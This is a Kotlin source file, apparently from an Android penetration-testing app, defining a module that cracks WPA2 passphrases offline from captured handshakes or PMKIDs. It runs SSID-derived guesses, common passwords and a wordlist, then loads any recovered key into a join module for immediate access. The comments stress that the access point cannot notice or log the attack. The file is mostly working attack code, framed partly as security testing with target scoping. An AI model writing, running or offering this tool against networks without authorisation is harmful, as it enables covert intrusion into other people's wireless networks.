package dev.cyphernova.mobileops.modules.tier0

import android.content.Context
import dev.cyphernova.mobileops.core.capability.Tier
import dev.cyphernova.mobileops.core.crack.CandidateSource
import dev.cyphernova.mobileops.core.crack.CaptureFormats
import dev.cyphernova.mobileops.core.crack.HandshakeCapture
import dev.cyphernova.mobileops.core.crack.PassphraseSearch
import dev.cyphernova.mobileops.core.evidence.Finding
import dev.cyphernova.mobileops.core.evidence.Severity
import dev.cyphernova.mobileops.core.module.Intrusiveness
import dev.cyphernova.mobileops.core.module.ModuleCategory
import dev.cyphernova.mobileops.core.module.ModuleContext
import dev.cyphernova.mobileops.core.module.ModuleOutcome
import dev.cyphernova.mobileops.core.module.PentestModule
import dev.cyphernova.mobileops.core.net.NetworkJoin
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

/**
 * Recovers a WPA2 passphrase from a captured handshake, offline.
 *
 * This is the module that answers "get me onto a network I do not have the key for", and it is
 * worth being exact about why it is shaped the way it is.
 *
 * WPA2-PSK cannot be attacked online. Every guess costs a full association attempt, the AP
 * rate-limits them, and the whole thing is visible in its logs. What it *can* be attacked is
 * offline: the four-way handshake carries the nonces, the MAC addresses and a MIC in the clear,
 * which is everything needed to test a guess with no network involved at all. No AP to notice,
 * no lockout, no log entry — just arithmetic, at whatever speed the hardware manages.
 *
 * The capture has to come from elsewhere. Collecting a handshake means hearing frames addressed
 * to other stations, which needs monitor mode, and Android has never exposed that to an app at
 * any patch level. So the division is: an adapter that can monitor collects the handshake, and
 * the phone does the part that is pure computation. Drop a `.22000` or `.hccapx` file into the
 * app's capture folder and this reads it.
 *
 * A PMKID is the cheaper target of the two and worth asking for specifically: it comes out of
 * the AP's own first response to an association request, so it needs no legitimate client to
 * have been present at all.
 */
class HandshakeCrackModule : PentestModule {
    override val id = "t0.crack.handshake"
    override val title = "Crack captured handshake"
    override val description =
        "Recovers a WPA2 passphrase offline from a captured four-way handshake or PMKID. Drop a " +
            ".22000 or .hccapx file into the app's captures folder. Needs no network — the " +
            "capture itself has to come from an adapter that does monitor mode."
    override val requiredTier = Tier.T0_STOCK
    override val intrusiveness = Intrusiveness.PASSIVE
    override val category = ModuleCategory.EXPLOIT

    /**
     * Cracking is scoped to a selected network on purpose.
     *
     * A capture file can hold handshakes for every AP that was audible when it was taken,
     * including a good many that have nothing to do with the engagement. Requiring a target means
     * the operator names what they are testing rather than the tool working through the
     * neighbourhood because it happened to be in the file.
     */
    override val requiresTarget = true

    override suspend fun run(
        context: ModuleContext,
        emit: suspend (Finding) -> Unit,
    ): ModuleOutcome {
        val androidContext = context.androidContext
        val captureDir = externalDir(androidContext, CAPTURE_DIR)
        val wordlistDir = externalDir(androidContext, WORDLIST_DIR)

        val networks = context.targets.networks()
        if (networks.isEmpty()) {
            return ModuleOutcome.Blocked(
                "No network selected. Pick the network you are testing on the Targets tab — " +
                    "a capture file usually holds handshakes for every AP that was audible when " +
                    "it was taken, and only the one under test should be attacked.",
            )
        }

        val captures = loadCaptures(captureDir)
        if (captures.isEmpty()) {
            return ModuleOutcome.Blocked(
                "No captures found. Copy a .22000 or .hccapx file into\n" +
                    "${captureDir.absolutePath}\n" +
                    "A stock handset cannot collect one itself — monitor mode has never been " +
                    "available to an Android app — so it has to come from an adapter that can. " +
                    "hcxpcapngtool converts a pcapng to .22000.",
            )
        }

        emit(inventoryFinding(captures, captureDir))

        val wordlist = wordlistDir.listFiles()
            ?.filter { it.isFile && it.length() > 0 }
            ?.maxByOrNull { it.length() }

        var cracked = 0
        var attempted = 0

        for (network in networks) {
            val ssid = network.ssid
            val forNetwork = captures.filter { it.ssid == ssid }
            if (forNetwork.isEmpty()) {
                emit(
                    note(
                        "No capture for ${network.label}",
                        ssid.ifBlank { network.bssid },
                        "The capture files hold handshakes for " +
                            captures.map { it.ssid }.distinct().joinToString() +
                            ", none of which is this network. Capture a handshake for it first.",
                    ),
                )
                continue
            }

            attempted++
            if (attack(ssid, forNetwork, wordlist, emit)) cracked++
        }

        return when {
            cracked > 0 -> ModuleOutcome.Completed("$cracked passphrase(s) recovered.")
            attempted == 0 -> ModuleOutcome.Completed(
                "No capture matched the selected network(s).",
            )
            else -> ModuleOutcome.Completed(
                "No passphrase found for $attempted network(s) in the candidates tried.",
            )
        }
    }

    private suspend fun attack(
        ssid: String,
        captures: List<HandshakeCapture>,
        wordlist: File?,
        emit: suspend (Finding) -> Unit,
    ): Boolean {
        val deadline = System.currentTimeMillis() + BUDGET_MS

        // Cheapest and most likely first. The SSID-derived guesses cost a few hundred
        // derivations and land often enough to be worth going before anything longer.
        val quick = (CandidateSource.fromSsid(ssid) + CandidateSource.COMMON).distinct()
        val wordlistCount = wordlist?.let(CandidateSource::countLines) ?: 0
        val total = quick.size + wordlistCount

        val candidates = quick.asSequence() +
            (wordlist?.let(CandidateSource::fromFile) ?: emptySequence())

        val result = withContext(Dispatchers.Default) {
            PassphraseSearch.search(
                ssid = ssid,
                captures = captures,
                candidates = candidates,
                total = total,
                shouldContinue = { System.currentTimeMillis() < deadline },
            )
        }

        when (result) {
            is PassphraseSearch.Result.Found -> {
                emit(recoveredFinding(ssid, captures, result))
                // Handing it straight to the join module is the point: the recovered key becomes
                // access without the operator copying it anywhere.
                NetworkJoin.passphrase = result.passphrase
                return true
            }

            is PassphraseSearch.Result.Exhausted ->
                emit(exhaustedFinding(ssid, captures, result.tried, wordlist, complete = true))

            is PassphraseSearch.Result.Stopped ->
                emit(exhaustedFinding(ssid, captures, result.tried, wordlist, complete = false))
        }
        return false
    }

    private fun recoveredFinding(
        ssid: String,
        captures: List<HandshakeCapture>,
        result: PassphraseSearch.Result.Found,
    ) = Finding(
        moduleId = id,
        observedAtEpochMs = System.currentTimeMillis(),
        severity = Severity.CRITICAL,
        title = "WPA2 passphrase recovered for $ssid",
        subject = ssid,
        detail = "The passphrase is '${result.passphrase}', found after ${result.tried} " +
            "candidate(s) against a ${captures.first().label}. It has been loaded into the join " +
            "module, so 'Join target network' will now get onto $ssid without anything further.\n\n" +
            "What this establishes is about the passphrase, not the protocol: WPA2 held up " +
            "exactly as designed, and the key behind it did not. The search ran entirely offline " +
            "against a captured handshake, so the AP saw nothing, logged nothing and could not " +
            "have rate-limited it. Lengthening the passphrase is the fix; nothing configured on " +
            "the AP changes this.",
        data = mapOf(
            "ssid" to ssid,
            "passphrase" to result.passphrase,
            "candidates_tried" to result.tried.toString(),
            "capture_type" to captures.first().label,
        ),
    )

    private fun exhaustedFinding(
        ssid: String,
        captures: List<HandshakeCapture>,
        tried: Int,
        wordlist: File?,
        complete: Boolean,
    ) = Finding(
        moduleId = id,
        observedAtEpochMs = System.currentTimeMillis(),
        severity = Severity.INFO,
        title = "No passphrase found for $ssid",
        subject = ssid,
        detail = buildString {
            append("$tried candidate(s) tested against a ${captures.first().label} ")
            append(if (complete) "and the list was exhausted. " else "before the time budget ran out. ")
            append(
                "This says the passphrase is not among the candidates tried. It does not say the " +
                    "network is secure — the same capture can be worked on indefinitely, on " +
                    "faster hardware, against a larger list, with nothing on the network able to " +
                    "notice. ",
            )
            append(
                wordlist?.let { "Wordlist: ${it.name}. " }
                    ?: "No wordlist supplied — only the built-in patterns and names derived from " +
                    "the SSID were tried. Drop one into the wordlists folder for a real search. ",
            )
        },
        data = mapOf(
            "ssid" to ssid,
            "candidates_tried" to tried.toString(),
            "exhausted" to complete.toString(),
            "wordlist" to (wordlist?.name ?: ""),
        ),
    )

    private fun inventoryFinding(captures: List<HandshakeCapture>, directory: File): Finding {
        val bySsid = captures.groupingBy { it.ssid }.eachCount()
        val pmkids = captures.count { it is HandshakeCapture.Pmkid }
        return Finding(
            moduleId = id,
            observedAtEpochMs = System.currentTimeMillis(),
            severity = Severity.INFO,
            title = "${captures.size} capture(s) loaded",
            subject = directory.name,
            detail = "Read from ${directory.absolutePath}: " +
                bySsid.entries.joinToString { "${it.key} (${it.value})" } +
                ". $pmkids are PMKIDs, which need no client to have been present, and " +
                "${captures.size - pmkids} are four-way handshakes.",
            data = mapOf(
                "captures" to captures.size.toString(),
                "networks" to bySsid.keys.joinToString(),
                "pmkids" to pmkids.toString(),
            ),
        )
    }

    private fun note(title: String, subject: String, detail: String) = Finding(
        moduleId = id,
        observedAtEpochMs = System.currentTimeMillis(),
        severity = Severity.INFO,
        title = title,
        subject = subject,
        detail = detail,
    )

    private suspend fun loadCaptures(directory: File): List<HandshakeCapture> =
        withContext(Dispatchers.IO) {
            directory.listFiles().orEmpty()
                .filter { it.isFile && it.length() in 1..MAX_CAPTURE_BYTES }
                .flatMap { file ->
                    runCatching {
                        when {
                            file.name.endsWith(".hccapx", ignoreCase = true) ->
                                CaptureFormats.parseHccapx(file.readBytes())
                            else -> CaptureFormats.parse22000(file.readText())
                        }
                    }.getOrDefault(emptyList())
                }
        }

    /**
     * The app's own external directory, which needs no storage permission and is reachable from
     * a file manager — so a capture can be copied in without granting anything.
     */
    private fun externalDir(context: Context, name: String): File =
        (context.getExternalFilesDir(name) ?: File(context.filesDir, name)).apply { mkdirs() }

    private companion object {
        const val CAPTURE_DIR = "handshakes"
        const val WORDLIST_DIR = "wordlists"
        const val MAX_CAPTURE_BYTES = 64L * 1024 * 1024

        /**
         * A module run has to end. Three minutes is tens of thousands of derivations on a modern
         * handset, which finishes the built-in patterns and makes real progress into a wordlist;
         * the run reports where it got to and can simply be started again.
         */
        const val BUDGET_MS = 180_000L
    }
}
